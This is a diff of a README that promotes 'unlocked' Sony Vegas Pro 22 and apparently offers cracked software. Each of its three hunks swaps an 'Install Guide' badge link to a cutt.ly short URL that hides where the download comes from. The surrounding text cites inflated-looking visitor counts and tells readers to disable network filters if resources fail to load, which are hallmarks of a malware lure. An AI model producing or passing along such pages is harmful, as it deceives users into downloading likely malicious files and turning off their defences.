@@ -6,7 +6,7 @@
 
 **About VegasPro-Unlocked-2025**: VegasPro-Unlocked-2025 is a resource hub for Windows users eager to tap into the full capabilities of **Sony Vegas Pro 22**. This repository offers community-crafted tutorials, setup tips, and creative resources to enhance your video editing experience. Supported by 67K+ visitors and 43K+ subscribers, it’s perfect for creators looking to unlock advanced features in 2025!
 
-<a href="https://videocraftvegaspro.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/lrNyacJd" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
@@ -31,7 +31,7 @@ Step into video editing with **VegasPro-Unlocked-2025** using these simple steps
 5. **Resolve Access Issues** 🌐  
    If resources don’t load, try disabling any network filters or switching to a different browser (e.g., Chrome, Firefox, or Edge).
 
-<a href="https://videocraftvegaspro.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/lrNyacJd" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
@@ -46,7 +46,7 @@ Step into video editing with **VegasPro-Unlocked-2025** using these simple steps
 - 🌍 **Creative Network**: Join a global community of editors.  
 - 📅 **2025 Features**: Access the latest editing innovations.
 
-<a href="https://videocraftvegaspro.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/lrNyacJd" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
